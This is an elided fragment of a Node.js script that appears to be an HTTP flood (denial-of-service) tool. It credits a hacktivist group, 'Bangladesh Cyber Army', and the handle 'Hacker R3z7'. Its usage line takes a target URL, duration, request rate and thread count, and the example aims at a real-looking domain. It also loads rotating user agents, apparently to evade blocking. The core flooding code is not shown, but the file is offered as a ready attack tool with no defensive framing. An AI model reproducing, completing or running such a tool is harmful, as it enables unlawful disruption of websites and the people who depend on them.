...
if (process.argv.length < 5) {
  console.log(
    `Usage: node bca.js URL TIME REQ_PER_SEC THREADS\nExample: node bca.js https://ministerbd.com/  1000 8 200`
  );
  process.exit();
}
...
var userAgents = readLines("bcaaagent.txt");
...
╚═══╝╚═══╝╚╝╚╝╚═╗║╚═╝╚═══╝╚══╝╚══╝╚╝╚╝    ╚═══╝╚═╗╔╝╚══╝╚══╝╚╝     ╚╝ ╚╝╚╝ ╚╩╩╝╚═╗╔╝
              ...
              ╚══╝                             ╚══╝                            ╚══╝ 
`);
  console.log(`Hacker R3z7`);
  console.log(`Auther:𝐁𝐚𝐧𝐠𝐥𝐚𝐝𝐬𝐡 𝐂𝐲𝐛𝐞𝐫 𝐀𝐫𝐦𝐲 `);
